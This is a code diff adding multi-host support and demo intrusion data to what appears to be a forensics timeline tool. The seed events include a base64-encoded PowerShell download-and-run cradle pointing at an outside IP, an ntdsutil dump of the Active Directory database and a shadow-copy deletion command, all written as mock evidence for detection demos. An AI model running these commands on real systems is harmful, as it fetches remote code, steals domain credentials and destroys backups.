@@ -21,21 +21,33 @@ async function call(cmd, args) {
   return sample(cmd, args);
 }
 
+// Multi-host cases: the host the analyst is looking at (null = all hosts).
+// Applied to the timeline filter and to every per-case summary below.
+let hostScope = null;
+const withHost = (filter) => (hostScope ? Object.assign({}, filter, { host: hostScope }) : filter);
+
 export const backend = {
+  setHostScope: (h) => { hostScope = h || null; },
+  hostScope: () => hostScope,
   openCase: (path) => call("open_case", { path }),
+  addCollection: (collection_dir, host_name) =>
+    call("add_collection", { collectionDir: collection_dir, hostName: host_name || null }),
+  listHosts: () => call("list_hosts", {}),
+  renameHost: (old_name, new_name) => call("rename_host", { oldName: old_name, newName: new_name }),
+  caseOverview: () => call("case_overview", { host: hostScope }),
   ingest: (collection_dir, case_path, case_name, examiner) =>
     call("ingest_collection", { collectionDir: collection_dir, casePath: case_path, caseName: case_name, examiner }),
-  queryTimeline: (filter) => call("query_timeline", { filter }),
-  countTimeline: (filter) => call("count_timeline", { filter }),
+  queryTimeline: (filter) => call("query_timeline", { filter: withHost(filter) }),
+  countTimeline: (filter) => call("count_timeline", { filter: withHost(filter) }),
   eventRaw: (event_id) => call("event_raw", { eventId: event_id }),
   runHunt: (rules_dir) => call("run_hunt", { rulesDir: rules_dir || null }),
   huntResults: () => call("hunt_results", {}),
   setTriage: (event_id, triage_state, note) => call("set_triage", { eventId: event_id, triageState: triage_state, note: note || null }),
   clearTriage: (event_id) => call("clear_triage", { eventId: event_id }),
   listTriage: () => call("list_triage", {}),
-  exportFindings: (format, path, states) => call("export_findings", { format, path, states: states || null }),
-  exportCounts: () => call("export_counts", {}),
-  exportReport: (path) => call("export_report", { path }),
+  exportFindings: (format, path, states) => call("export_findings", { format, path, states: states || null, host: hostScope }),
+  exportCounts: () => call("export_counts", { host: hostScope }),
+  exportReport: (path) => call("export_report", { path, host: hostScope }),
   iocPreview: (text) => call("ioc_preview", { text }),
   iocSweep: (text) => call("ioc_sweep", { text }),
   readIocFile: (path) => call("read_ioc_file", { path }),
@@ -71,13 +83,16 @@ export const backend = {
   sigmaPreview: (config) => call("sigma_preview", { config }),
   sigmaHunt: (config) => call("sigma_hunt", { config }),
   sigmaSaved: () => call("sigma_saved", {}),
-  hostInfo: () => call("host_info", {}),
-  ingestLog: () => call("ingest_log", {}),
-  dailyActivity: () => call("daily_activity", {}),
+  hostInfo: () => call("host_info", { host: hostScope }),
+  ingestLog: () => call("ingest_log", { host: hostScope }),
+  dailyActivity: () => call("daily_activity", { host: hostScope }),
   pickExportFile: async (format) => {
     if (!hasTauri) return null;
     const ext = format === "stix" ? "json" : format === "html" ? "html" : "csv";
-    const name = format === "stix" ? "findings-stix.json" : format === "html" ? "case-report.html" : "findings.csv";
+    const base = format === "stix" ? "findings-stix" : format === "html" ? "case-report" : "findings";
+    // One host's export is named after it, so the files don't get mixed up.
+    const tag = hostScope ? "-" + String(hostScope).replace(/[^A-Za-z0-9._-]+/g, "_") : "";
+    const name = `${base}${tag}.${ext}`;
     return window.__TAURI__.dialog.save({
       title: format === "html" ? "Save case report" : "Export findings as " + format.toUpperCase(),
       defaultPath: name,
@@ -152,7 +167,11 @@ let SEED = [
   ev(T(2,22,44), "execution","execution.userassist","UserAssist","S-1-5-21…-1013","UserAssist run: C:\\Users\\jodell\\Downloads\\invoice.scr", false),
   ev(T(1,58,10), "logon","logon.failure","Evtx","administrator","Failed logon", false),
   ev(T(2,20,15), "filesystem","file.modified","Mft",null,"$SI modified: C:\\ProgramData\\upd.exe", false),
+  ev(T(2,16,2),  "execution","process.create","Evtx","jodell","Process created: powershell.exe -nop -w hidden -enc SQBFAFgAIAAo…", true, "ENCODED"),
 ];
+// Demo: give the encoded PowerShell event a real command line so Decode has something to peel.
+SEED[SEED.length - 1]._raw = { EventID: 4688, NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEALgBwAHMAMQAnACkA" };
 
 // pad with routine noise so virtualization is real (a few thousand rows)
 (function pad() {
@@ -217,8 +236,60 @@ function demoJob(kind, ms) {
   });
 }
 
+// ── Demo: multi-host ────────────────────────────────────────────────────────
+// The preview starts with one host. "+ Add host" (with window.__fxDemoPick set)
+// adds the domain controller the intruder moved to next.
+const HN = { wk: "WKSTN-07", dc: "SRV-DC01" };
+const DEMO_HOSTS = [{ key: "wk", host_source: "SYSTEM hive ComputerName",
+  collections: [{ collection_id: "c1", source_root: "C:\\cases\\WKSTN-07", ingested_utc: "2026-02-12T09:00:00", files: 214 }] }];
+function demoHosts() {
+  return DEMO_HOSTS.map((h) => ({ host: HN[h.key], host_source: h.host_source, collections: h.collections,
+    events: SEED.filter((e) => e.host === HN[h.key]).length }));
+}
+function addDemoHost() {
+  if (DEMO_HOSTS.some((h) => h.key === "dc")) return false;
+  const D = (h, m, s) => `2026-02-11T${String(h).padStart(2,"0")}:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}Z`;
+  const add = (...a) => { const e = ev(...a); e.host = HN.dc; SEED.push(e); return e; };
+  add(D(2,20,41), "logon", "logon.success", "Evtx", "svc_backup", "Successful logon (type 3) from 10.20.4.37 (WKSTN-07)", true, "LATERAL");
+  add(D(2,20,44), "persistence", "service.install", "Evtx", "svc_backup", "Service installed: PSEXESVC (C:\\Windows\\PSEXESVC.exe)", true, "LATERAL");
+  add(D(2,21,10), "execution", "process.create", "Evtx", "svc_backup", "Process created: ntdsutil.exe \"ac i ntds\" ifm \"create full C:\\ProgramData\\ifm\" q q", true, "CRED");
+  add(D(2,21,58), "filesystem", "file.create", "UsnJrnl", null, "USN FILE_CREATE: C:\\ProgramData\\ifm\\Active Directory\\ntds.dit", true, "STAGING");
+  add(D(2,23,2), "execution", "process.create", "Evtx", "svc_backup", "Process created: vssadmin.exe delete shadows /all /quiet", true, "ANTI-FORENSIC");
+  const arts = [["logon","logon.success","Evtx"],["filesystem","file.modified","Mft"],["execution","execution.prefetch","Prefetch"]];
+  const base = new Date("2026-02-11T00:30:00Z").getTime();
+  for (let i = 0; i < 900; i++) {
+    const a = arts[i % arts.length];
+    const e = ev(new Date(base + i * 20000).toISOString().replace(".000",""), a[0], a[1], a[2], null, `${a[1]}: C:\\Windows\\System32\\${["lsass.exe","dns.exe","dfsrs.exe","svchost.exe"][i % 4]}`, false);
+    e.host = HN.dc; SEED.push(e);
+  }
+  SEED.sort((x, y) => x.ts.localeCompare(y.ts));
+  DEMO_HOSTS.push({ key: "dc", host_source: "SYSTEM hive ComputerName",
+    collections: [{ collection_id: "c2", source_root: "C:\\cases\\demo-collection", ingested_utc: "2026-02-12T10:30:00", files: 188 }] });
+  return true;
+}
+const hasDC = () => DEMO_HOSTS.some((h) => h.key === "dc");
+const scopeRows = (h) => (h ? SEED.filter((e) => e.host === h) : SEED);
+
 function sample(cmd, args) {
   if (cmd === "cancel_job") { demoCancel = true; return Promise.resolve(null); }
+  if (cmd === "list_hosts") { return Promise.resolve(demoHosts()); }
+  if (cmd === "add_collection") {
+    if (hasDC()) return Promise.reject(new Error("this collection folder is already in this case"));
+    return demoJob("ingest", 4000).then(() => {
+      addDemoHost();
+      if (args.hostName) { const old = HN.dc; HN.dc = args.hostName; SEED.forEach((e) => { if (e.host === old) e.host = HN.dc; }); }
+      return { overview: overview(null), host: HN.dc, merged: false, events: 905 };
+    });
+  }
+  if (cmd === "rename_host") {
+    const key = Object.keys(HN).find((k) => HN[k] === args.oldName);
+    if (!key) return Promise.resolve(null);
+    if (Object.values(HN).includes(args.newName)) return Promise.reject(new Error(`There's already a host called ${args.newName}. Pick another name.`));
+    HN[key] = args.newName;
+    SEED.forEach((e) => { if (e.host === args.oldName) e.host = args.newName; });
+    return Promise.resolve(null);
+  }
+  if (cmd === "case_overview") { return Promise.resolve(overview(args.host)); }
   if (cmd === "progress_snapshot") { return Promise.resolve(demoSnap); }
   if (cmd === "ingest_collection" && window.__fxDemoPick) {
     return demoJob("ingest", 6000).then(() => overview());
@@ -227,7 +298,7 @@ function sample(cmd, args) {
     return demoJob("Running detections", 3000).then(() => sampleDetections());
   }
   if (cmd === "open_case" || cmd === "ingest_collection") {
-    return Promise.resolve(overview());
+    return Promise.resolve(overview(null));
   }
   if (cmd === "query_timeline") {
     return Promise.resolve(applyFilter(SEED, args.filter));
@@ -242,7 +313,13 @@ function sample(cmd, args) {
     return Promise.resolve(e ? JSON.stringify(rawFor(e), null, 2) : null);
   }
   if (cmd === "run_hunt" || cmd === "hunt_results") {
-    return Promise.resolve(demoApplyAllow().live);
+    // Demo only: the real app derives tactics from MITRE's ATT&CK data.
+    const TAC = { T1486: "Impact", T1490: "Impact", T1657: "Impact", T1048: "Exfiltration", T1567: "Exfiltration", "T1567.002": "Exfiltration",
+      "T1036.005": "Stealth", T1003: "Credential Access", "T1003.001": "Credential Access", "T1021.002": "Lateral Movement", "T1021.001": "Lateral Movement",
+      T1189: "Initial Access", T1033: "Discovery", "T1059.001": "Execution" };
+    const ORDER = ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Stealth", "Defense Impairment", "Credential Access", "Discovery", "Lateral Movement", "Collection", "Command and Control", "Exfiltration", "Impact"];
+    return Promise.resolve(demoApplyAllow().live.map((d) => ({ ...d,
+      tactics: [...new Set((d.attack || []).map((t) => TAC[t]).filter(Boolean))].sort((a, b) => ORDER.indexOf(a) - ORDER.indexOf(b)) })));
   }
   if (cmd === "allowlist_get" || cmd === "allowlist_set") {
     if (cmd === "allowlist_set") DEMO_ALLOW.splice(0, DEMO_ALLOW.length, ...(args.entries || []));
@@ -281,10 +358,21 @@ function sample(cmd, args) {
       { rule_id: "sigma:demo-2", title: "Suspicious Encoded PowerShell Command Line", severity: "high", attack: ["T1059.001"], summary: "powershell -enc", event_ids: ids.slice(3), ts: "2026-02-11T00:05:00", host: "WKSTN-07", engine: "sigma" });
     return Promise.resolve(SAMPLE_KV.sigma);
   }
+  if (cmd === "host_info" && args.host && args.host === HN.dc) {
+    const id = (SEED.find((e) => e.host === HN.dc) || {}).id || "";
+    return Promise.resolve({
+      computer_name: { value: HN.dc, event_id: id, source: "C/Windows/System32/config/SYSTEM" },
+      domain: { value: "corp.example", event_id: id, source: "C/Windows/System32/config/SYSTEM" },
+      os: { value: { product: "Windows Server 2022 Standard", version: "21H2", build: "20348", ubr: 2700, edition: "ServerStandard" }, event_id: id, source: "C/Windows/System32/config/SOFTWARE" },
+      timezone: { value: { name: "GMT Standard Time", utc_offset: "UTC+00:00", active_utc_offset: "UTC+00:00" }, event_id: id, source: "C/Windows/System32/config/SYSTEM" },
+      interfaces: [{ value: { ip: "10.20.0.10", dhcp: false, subnet_mask: "255.255.255.0", gateway: "10.20.0.1", dns: "127.0.0.1" }, event_id: id, source: "C/Windows/System32/config/SYSTEM" }],
+      accounts: [], collection_tool: "KAPE", asserted_host: HN.dc, evidence_files: 188, evidence_bytes: 2410000000, other_names: [],
+    });
+  }
   if (cmd === "host_info") {
     const ev = (i) => (SEED[i] || {}).id || "";
     return Promise.resolve({
-      computer_name: { value: "WKSTN-07", event_id: ev(1), source: "C/Windows/System32/config/SYSTEM" },
+      computer_name: { value: HN.wk, event_id: ev(1), source: "C/Windows/System32/config/SYSTEM" },
       domain: { value: "corp.example", event_id: ev(1), source: "C/Windows/System32/config/SYSTEM" },
       os: { value: { product: "Windows 11 Pro", version: "23H2", build: "22631", ubr: 4317, edition: "Professional", install_date: "2024-03-02T09:14:00Z", registered_owner: "IT" }, event_id: ev(2), source: "C/Windows/System32/config/SOFTWARE" },
       timezone: { value: { name: "GMT Standard Time", utc_offset: "UTC+00:00", active_utc_offset: "UTC+00:00",
@@ -301,7 +389,7 @@ function sample(cmd, args) {
         { user: "helpdesk", rid: 1001, full_name: "Help Desk", created: "2026-02-10T23:58:00Z", last_logon: "2026-02-11T00:04:00Z", logon_count: 3, password_last_set: "2026-02-10T23:58:00Z", disabled: false, local: true, sid: "S-1-5-21-1-2-3-1001", profile_path: "C:\\Users\\helpdesk", event_id: ev(8) },
         { user: "j.smith", local: false, sid: "S-1-5-21-9-8-7-1104", profile_path: "C:\\Users\\j.smith", event_id: ev(9) },
       ],
-      collection_tool: "KAPE", asserted_host: "WKSTN-07", evidence_files: 214, evidence_bytes: 1830000000, other_names: [],
+      collection_tool: "KAPE", asserted_host: HN.wk, evidence_files: 214, evidence_bytes: 1830000000, other_names: [],
     });
   }
   if (cmd === "sigma_saved") { return Promise.resolve({ config: null, results: SAMPLE_KV.sigma || null }); }
@@ -325,16 +413,24 @@ function sample(cmd, args) {
   }
   if (cmd === "export_counts") { return Promise.resolve({ validated: 1, unconfirmed: sampleDetections().length - 1, false_positive: 0, dismissed: 0 }); }
   if (cmd === "ingest_log") { return Promise.resolve([
-    { source_path: "C/Windows/System32/winevt/Logs/Security.evtx", artefact_kind: "Evtx", status: "parsed", detail: null, records_read: 4217, events_emitted: 4217, warning_count: 0 },
-    { source_path: "C/$MFT", artefact_kind: "Mft", status: "parsed", detail: null, records_read: 1051, events_emitted: 1051, warning_count: 3 },
-    { source_path: "C/Windows/Prefetch/README.txt", artefact_kind: "Unclassified", status: "unsupported", detail: "no parser for this artefact kind", records_read: 0, events_emitted: 0, warning_count: 0 },
-    { source_path: "C/corrupt/SOFTWARE", artefact_kind: "RegistryGeneric", status: "failed", detail: "notatin: unexpected end of hive bin at offset 0x4000", records_read: 0, events_emitted: 0, warning_count: 0 },
-  ]); }
-  if (cmd === "daily_activity") { return Promise.resolve(demoDailyActivity()); }
+    ...(hasDC() ? [{ source_path: "C/Windows/NTDS/ntds.dit", artefact_kind: "Unclassified", status: "unsupported", detail: "no parser for this artefact kind", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.dc },
+      { source_path: "C/Windows/System32/winevt/Logs/Security.evtx", artefact_kind: "Evtx", status: "parsed", detail: null, records_read: 905, events_emitted: 905, warning_count: 0, host: HN.dc }] : []),
+    { source_path: "C/Windows/System32/winevt/Logs/Security.evtx", artefact_kind: "Evtx", status: "parsed", detail: null, records_read: 4217, events_emitted: 4217, warning_count: 0, host: HN.wk },
+    { source_path: "C/$MFT", artefact_kind: "Mft", status: "parsed", detail: null, records_read: 1051, events_emitted: 1051, warning_count: 3, host: HN.wk },
+    { source_path: "C/Windows/Prefetch/README.txt", artefact_kind: "Unclassified", status: "unsupported", detail: "no parser for this artefact kind", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
+    { source_path: "C/corrupt/SOFTWARE", artefact_kind: "RegistryGeneric", status: "failed", detail: "notatin: unexpected end of hive bin at offset 0x4000", records_read: 0, events_emitted: 0, warning_count: 0, host: HN.wk },
+  ].filter((r) => !args.host || r.host === args.host)); }
+  if (cmd === "daily_activity") {
+    const d = demoDailyActivity(), dc = hasDC();
+    if (!dc || !args.host) return Promise.resolve(dc ? d.map((x) => ({ ...x, total: x.total + Math.round(x.total * 0.4) })) : d);
+    if (args.host === HN.dc) return Promise.resolve(d.map((x) => ({ ...x, total: Math.round(x.total * 0.4), flagged: x.flagged ? 5 : 0 })));
+    return Promise.resolve(d);
+  }
   if (cmd === "list_triage") { return Promise.resolve(DEMO_TRIAGE); }
   if (cmd === "set_triage") {
     DEMO_TRIAGE = DEMO_TRIAGE.filter((t) => t.event_id !== args.eventId);
-    DEMO_TRIAGE.push({ event_id: args.eventId, triage_state: args.triageState, note: args.note || null });
+    const e = SEED.find((x) => x.id === args.eventId) || {};
+    DEMO_TRIAGE.push({ event_id: args.eventId, triage_state: args.triageState, note: args.note || null, ts: (e.ts || "").replace("Z", ""), host: e.host || null, message: e.message || "" });
     return Promise.resolve(null);
   }
   if (cmd === "clear_triage") {
@@ -426,7 +522,21 @@ function sampleDetections() {
       severity: "high", attack: ["T1567"], engine: "single_event",
       summary: "Upload service visited: gofile.io",
       event_ids: [], ts: T(2,44,0), host: HOST },
-  ].sort((a,b) => sevRank(b.severity) - sevRank(a.severity));
+  ].map((d) => ({ ...d, host: d.host === HOST ? HN.wk : d.host }))
+   .concat(hasDC() ? [
+    { rule_id: "psexec_service_install", title: "PsExec service installed (remote execution)",
+      severity: "high", attack: ["T1021.002", "T1569.002"], engine: "single_event",
+      summary: "Service PSEXESVC installed by svc_backup", event_ids: findId("PSEXESVC (C:"), ts: T(2,20,44), host: HN.dc },
+    { rule_id: "ntds_extraction", title: "Active Directory database copied (NTDS.dit)",
+      severity: "critical", attack: ["T1003.003"], engine: "single_event",
+      summary: "ntdsutil IFM: create full C:\\ProgramData\\ifm", event_ids: findId("ntdsutil"), ts: T(2,21,10), host: HN.dc },
+    { rule_id: "shadow_copy_delete", title: "Volume shadow copies deleted",
+      severity: "critical", attack: ["T1490"], engine: "single_event",
+      summary: "vssadmin delete shadows /all /quiet", event_ids: findId("vssadmin"), ts: T(2,23,2), host: HN.dc },
+    { rule_id: "ioc:ipv4:10.20.4.37", title: "IOC match: 10.20.4.37 (IPv4)", severity: "high", attack: [], engine: "ioc",
+      summary: "1 event · Evtx 1", event_ids: findId("from 10.20.4.37"), ts: T(2,20,41), host: HN.dc },
+   ] : [])
+   .sort((a,b) => sevRank(b.severity) - sevRank(a.severity));
 }
 function sevRank(s){ return {informational:1,low:2,medium:3,high:4,critical:5}[s]||0; }
 
@@ -436,6 +546,7 @@ function applyFilter(rows, f = {}) {
     out = out.filter((e) => (e.message || "").toLowerCase().includes(q) || (e.user||"").toLowerCase().includes(q)); }
   if (f.ioc) { const q = String(f.ioc).toLowerCase();
     out = out.filter((e) => (e.message || "").toLowerCase().includes(q)); }
+  if (f.host) out = out.filter((e) => e.host === f.host);
   if (f.artefact) out = out.filter((e) => e.artefact === f.artefact);
   if (f.category) out = out.filter((e) => e.category === f.category);
   if (f.flagged_only) out = out.filter((e) => e.flagged);
@@ -443,15 +554,15 @@ function applyFilter(rows, f = {}) {
   return out.slice(off, off + lim);
 }
 
-function overview() {
-  const by = {};
-  SEED.forEach((e) => (by[e.artefact] = (by[e.artefact] || 0) + 1));
+function overview(host) {
+  const by = {}, rows = scopeRows(host);
+  rows.forEach((e) => (by[e.artefact] = (by[e.artefact] || 0) + 1));
   return {
     case_id: "c0ffee00-1a2b-4c3d-8e9f-000000000001",
-    total_events: SEED.length,
+    total_events: rows.length,
     by_artefact: Object.entries(by).map(([label, count]) => ({ label, count })).sort((a,b)=>b.count-a.count),
     ingest: [{ label: "parsed", count: 11 }, { label: "unsupported", count: 2 }, { label: "failed", count: 0 }],
-    srum_top_talkers: [
+    srum_top_talkers: host && host === HN.dc ? [] : [
       { app: "c:\\programdata\\upd.exe", user: "S-1-5-21…-1013", bytes_sent: 4831838208, bytes_recv: 20551 },
       { app: "OUTLOOK.EXE", user: "S-1-5-21…-1013", bytes_sent: 88214400, bytes_recv: 149423616 },
       { app: "chrome.exe", user: "S-1-5-21…-1013", bytes_sent: 41205760, bytes_recv: 620494848 },
@@ -464,5 +575,5 @@ function rawFor(e) {
   return { artefact: e.artefact, action: e.action, timestamp: e.ts, timestamp_kind: e.ts_kind,
     host: e.host, user: e.user, message: e.message,
     provenance: { parser: e.artefact.toLowerCase(), source_path: `triage/${e.artefact}`, note: "sample data — no real evidence" },
-    flagged: e.flagged, tag: e._tag };
+    flagged: e.flagged, tag: e._tag, ...(e._raw ? { event_data: e._raw } : {}) };
 }
